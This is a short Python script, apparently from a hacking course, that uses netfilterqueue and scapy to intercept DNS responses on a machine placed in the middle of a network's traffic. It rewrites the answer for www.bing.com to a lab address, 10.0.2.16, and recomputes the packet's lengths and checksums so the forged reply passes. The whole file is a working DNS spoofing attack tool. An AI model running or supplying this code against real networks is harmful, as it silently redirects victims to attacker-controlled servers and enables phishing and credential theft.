#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

"""
+ process packet take a packet as parameter
+ 
"""


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # packet.drop() # call drop for droping packet only
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            # Create a spoof answer
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.16')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Make sure work and not corrupt
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Convert the scapy packet to a normal string
            # Give the string to the original packet
            packet.set_payload(str(scapy_packet))
        # print(scapy_packet.show()) # Test only

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# call back function use in every single packet in the queue
# process_packet will be executed in every packet that trapped in the netfilter queue
queue.bind(0, process_packet)
queue.run()

"""
using flush in the terminal to flush the program
"""

